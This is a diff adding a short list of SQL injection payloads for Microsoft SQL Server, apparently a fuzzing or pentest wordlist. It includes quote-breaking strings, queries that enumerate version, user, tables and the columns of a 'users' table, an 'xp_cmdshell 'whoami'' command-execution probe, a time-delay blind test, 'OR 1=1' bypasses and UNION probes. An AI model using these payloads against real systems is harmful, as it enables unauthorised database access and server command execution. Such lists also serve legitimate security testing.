@@ -1,0 +1,13 @@
+'
+"
+'--
+SELECT @@VERSION, SUSER_SNAME(), DB_NAME();
+SELECT name FROM sysobjects WHERE xtype = 'U';
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');
+EXEC xp_cmdshell 'whoami';
+WAITFOR DELAY '0:0:5';
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
